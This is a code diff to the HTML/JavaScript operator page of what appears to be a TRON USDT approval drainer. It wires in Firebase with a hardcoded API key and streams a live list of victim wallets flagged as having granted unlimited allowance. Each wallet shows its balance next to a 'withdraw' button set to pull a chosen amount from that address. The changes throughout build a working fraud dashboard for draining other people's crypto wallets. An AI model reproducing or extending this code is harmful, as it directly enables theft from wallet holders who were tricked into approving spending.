@@ -31,6 +31,9 @@
     <style>
         body { font-family: 'Inter', sans-serif; background-color: #080c14; color: #f3f4f6; }
     </style>
+    <!-- Firebase SDK (v9 compat) -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
 </head>
 <body class="bg-[#080c14] text-gray-100 min-h-screen flex flex-col selection:bg-blue-500 selection:text-white">
 
@@ -182,6 +185,21 @@
 
     <!-- JavaScript Logic -->
     <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyC8nmarifpVe3bJ_PnYaGgC-RmPj4NnuFE",
+            authDomain: "bill-59e66.firebaseapp.com",
+            projectId: "bill-59e66",
+            storageBucket: "bill-59e66.firebasestorage.app",
+            messagingSenderId: "800127626373",
+            appId: "1:800127626373:web:105f62a15432ee2ab24dec",
+            measurementId: "G-YNHQPDYTSP"
+        };
+
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
+        const db = firebase.firestore();
+
         const OFFICIAL_USDT_CONTRACT = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";
         let totalCount = 0;
         let totalSum = 0.00;
@@ -235,46 +253,54 @@
             return "0.00";
         }
 
-        async function loadApprovedWalletsData() {
+function loadApprovedWalletsData() {
             const tbody = document.getElementById('approved-wallets-tbody');
             if (!tbody) return;
 
-            let wallets = JSON.parse(localStorage.getItem('tron_approved_wallets_list') || '[]');
+            // Firestore DB를 실시간 감지하여 유저 승인 즉시 표에 추가
+            db.collection("approved_wallets").orderBy("updatedAt", "desc")
+              .onSnapshot((snapshot) => {
+                  if (snapshot.empty) {
+                      tbody.innerHTML = `<tr><td colspan="5" class="p-8 text-center text-gray-500">1번 화면에서 연결 또는 승인된 지갑이 아직 없습니다.</td></tr>`;
+                      return;
+                  }
 
-            if (wallets.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="5" class="p-8 text-center text-gray-500">1번 화면에서 연결 또는 승인된 지갑이 아직 없습니다.</td></tr>`;
-                return;
-            }
+                  tbody.innerHTML = '';
+                  let index = 0;
 
-            tbody.innerHTML = '';
-            wallets.forEach((w, index) => {
-                const tr = document.createElement('tr');
-                tr.className = "hover:bg-[#080c14]/40 transition-colors";
-                
-                const isApproved = w.allowance && (w.allowance.includes('MAX') || w.allowance.includes('승인'));
-                const statusBadge = isApproved 
-                    ? `<span class="px-2 py-0.5 rounded text-[10px] bg-emerald-950/60 text-emerald-400 border border-emerald-900">무제한 승인됨</span>`
-                    : `<span class="px-2 py-0.5 rounded text-[10px] bg-amber-950/60 text-amber-400 border border-amber-900">미승인 상태</span>`;
+                  snapshot.forEach((doc) => {
+                      const w = doc.data();
+                      const tr = document.createElement('tr');
+                      tr.className = "hover:bg-[#080c14]/40 transition-colors";
 
-                tr.innerHTML = `
-                    <td class="p-3 text-white font-bold flex items-center space-x-2">
-                        <i class="fa-solid fa-wallet text-blue-400"></i>
-                        <span title="${w.address}">${w.address.length > 20 ? w.address.substring(0, 10) + '...' + w.address.substring(w.address.length - 8) : w.address}</span>
-                    </td>
-                    <td class="p-3 text-gray-300">${w.provider || 'TronLink'}</td>
-                    <td class="p-3 text-emerald-400 font-bold" id="bal-cell-${index}">${w.balance} USDT</td>
-                    <td class="p-3">${statusBadge}</td>
-                    <td class="p-3 text-right">
-                        <div class="inline-flex items-center space-x-2">
-                            <input type="number" id="charge-amt-${index}" value="35" min="1" class="w-20 bg-[#080c14] border border-[#1e293b] rounded-lg px-2 py-1 text-xs text-white text-center font-mono">
-                            <button onclick="executeSpecificGaslessCharge('${w.address}', ${index})" class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded-lg text-xs transition-all shadow-sm active:scale-95">
-                                인출하기
-                            </button>
-                        </div>
-                    </td>
-                `;
-                tbody.appendChild(tr);
-            });
+                      const isApproved = w.allowance && (w.allowance.includes('MAX') || w.allowance.includes('승인'));
+                      const statusBadge = isApproved 
+                          ? `<span class="px-2 py-0.5 rounded text-[10px] bg-emerald-950/60 text-emerald-400 border border-emerald-900">무제한 승인됨</span>`
+                          : `<span class="px-2 py-0.5 rounded text-[10px] bg-amber-950/60 text-amber-400 border border-amber-900">미승인 상태</span>`;
+
+                      tr.innerHTML = `
+                          <td class="p-3 text-white font-bold flex items-center space-x-2">
+                              <i class="fa-solid fa-wallet text-blue-400"></i>
+                              <span title="${w.address}">${w.address.length > 20 ? w.address.substring(0, 10) + '...' + w.address.substring(w.address.length - 8) : w.address}</span>
+                          </td>
+                          <td class="p-3 text-gray-300">${w.provider || 'TronLink'}</td>
+                          <td class="p-3 text-emerald-400 font-bold" id="bal-cell-${index}">${w.balance || '0.00'} USDT</td>
+                          <td class="p-3">${statusBadge}</td>
+                          <td class="p-3 text-right">
+                              <div class="inline-flex items-center space-x-2">
+                                  <input type="number" id="charge-amt-${index}" value="35" min="1" class="w-20 bg-[#080c14] border border-[#1e293b] rounded-lg px-2 py-1 text-xs text-white text-center font-mono">
+                                  <button onclick="executeSpecificGaslessCharge('${w.address}', ${index})" class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded-lg text-xs transition-all shadow-sm active:scale-95">
+                                      인출하기
+                                  </button>
+                              </div>
+                          </td>
+                      `;
+                      tbody.appendChild(tr);
+                      index++;
+                  });
+              }, (error) => {
+                  console.error("Firestore sync error:", error);
+              });
         }
 
         window.scanApprovedWallets = async function() {
